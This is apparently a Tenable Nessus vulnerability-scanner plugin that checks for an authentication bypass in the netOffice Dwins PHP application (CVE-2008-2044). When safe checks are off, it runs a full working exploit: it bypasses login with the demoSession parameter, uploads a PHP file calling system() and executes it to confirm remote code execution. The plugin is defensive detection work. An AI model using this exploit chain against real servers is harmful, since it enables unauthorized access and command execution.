#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(31342);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-2044");
  script_bugtraq_id(28051);
  script_xref(name:"SECUNIA", value:"29193");

  script_name(english:"netOffice Dwins demoSession Parameter Authentication Bypass");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running netOffice Dwins, an open source project
management application written in PHP. 

The version of netOffice Dwins installed on the remote host allows an
attacker to bypass authentication and access parts of the affected
application to which access would not ordinarily be allowed. Such 
access could be gained by setting the 'demoSession' request parameter 
to '1'.  One possible means of attack that this reportedly allows is 
the uploading of arbitrary PHP files to be executed on the remote host, 
subject to the privileges under which the web server operates.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/488958/30/0/threaded");
  # http://web.archive.org/web/20090113104032/http://netofficedwins.sourceforge.net/modules/news/article.php?storyid=47
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?54091927");
  script_set_attribute(attribute:"solution", value:
"Upgrade to netOffice Dwins 1.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/03/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:netoffice:dwins");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/netofficedwins", "/netoffice", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to bypass authentication and get the "Upload a File" form.
  url = string(dir, "/projects_site/uploadfile.php");

  w = http_send_recv3(method:"GET",
    item:string(url, "?demoSession=1"), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If we get the form...
  if ('method="POST" action="../projects_site/uploadfile.php?action=add' >< res)
  {
    # We're done if safe checks are enabled.
    if (safe_checks())
    {
      report = string(
        "Note that Nessus did not actually check if it was possible to leverage\n",
        "this issue to upload arbitrary PHP files because the Safe Checks\n",
        "setting was in effect when this scan was run.\n"
      );
    }
    # Try to exploit the issue to upload a file and then execute it.
    else
    {
      cmd = "id";
      fname = string(SCRIPT_NAME, "-", rand(), ".php");

      bound = "nessus";
      boundary = string("--", bound);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="upload"; filename="', fname, '"', "\r\n",
        "Content-Type: application/octet-stream\r\n",
        "\r\n",
        '<?php system(', cmd, "); # generated by the Nessus plugin ', SCRIPT_NAME, ' ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
        "\r\n",
        "100000000\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="submit"', "\r\n",
        "\r\n",
        "Save\r\n",

        boundary, "--", "\r\n"
      );
      w = http_send_recv3(method:"POST",  port: port,
      	item: url+"?demoSession=1&allowPhp=true&action=add&project=&task=#filedetailsAnchor",
	content_type: "multipart/form-data; boundary="+bound,
	data: postdata);
      if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
      # res = strcat(w[0], w[1], '\r\n', w[2]);

      # Get a listing of files.
      w = http_send_recv3(method:"GET",
        item:string(dir, "/projects_site/doclists.php?demoSession=1"), 
        port:port
      );
      if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
      res = w[2];

      uploaded_file = NULL;
      pat = string('">([0-9]+--', fname, ')<');
      matches = egrep(pattern:pat, string:res);
      if (matches) 
      {
        foreach match (split(matches)) 
        {
          match = chomp(match);
          item = eregmatch(pattern:pat, string:match);
          if (!isnull(item))
          {
            uploaded_file = item[1];
            break;
          }
        }
      }

      # Now try to run the command.
      if (isnull(uploaded_file))
      {
        report = string(
          "Nessus was unable to exploit this issue even though the installed\n",
          "version of netOffice Dwins appears vulnerable.\n"
        );
      }
      else
      {
        w = http_send_recv3(method:"GET",
          item:string(dir, "/files/", uploaded_file), 
          port:port
        );
	if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
	res = w[2];

        if (
          # the output looks like it's from id or...
          egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
          # PHP's disable_functions prevents running system().
          egrep(pattern:"Warning.+ has been disabled for security reasons", string:res)
        )
        {
          if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
          {
            report = string(
              "Nessus was able to execute the command '", cmd, "' on the remote host by\n",
              "uploading a file with PHP code and then calling it using the URL :\n",
              "\n",
              "  ", dir, "/files/", uploaded_file, "\n",
              "\n",
              "It produced the following results :\n",
              "\n",
              "  ", data_protection::sanitize_uid(output:res)
            );
          }
        }

        if (isnull(report))
        {
          report = string(
            "Nessus was unable to exploit this issue even though the installed\n",
            "version of netOffice Dwins appears vulnerable.  Look in the 'files'\n",
            "directory, under the netOffice Dwins installation directory, on the\n",
            "remote host for a file with the following name :\n",
            "\n",
            "  ", uploaded_file, "\n"
          );
        }
      }
    }

    if (report_verbosity) security_hole(port:port, extra:string("\n", report));
    else security_hole(port);
    exit(0);
  }
}
